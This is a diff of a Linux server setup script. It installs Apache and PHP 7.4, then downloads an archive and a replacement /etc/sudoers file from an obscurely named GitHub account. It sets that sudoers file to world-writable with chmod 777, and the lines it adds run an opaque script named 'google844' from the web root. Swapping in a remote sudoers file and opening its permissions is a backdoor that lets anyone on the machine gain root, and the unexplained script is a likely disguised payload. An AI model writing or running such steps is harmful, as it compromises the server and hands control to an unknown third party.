@@ -1,6 +1,8 @@
-apt-get install apache2
+apt-get install -y apache2
 
-apt-get install php
+apt-get install -y php7.4
+
+apt-get install -y php7.4-gmp
 
 wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/Documents.tar.gz
 
@@ -23,3 +25,7 @@ cd /etc/
 wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/sudoers
 
 chmod 777 -R /etc/sudoers
+
+cd /var/www/html/google844
+
+bash ./google844
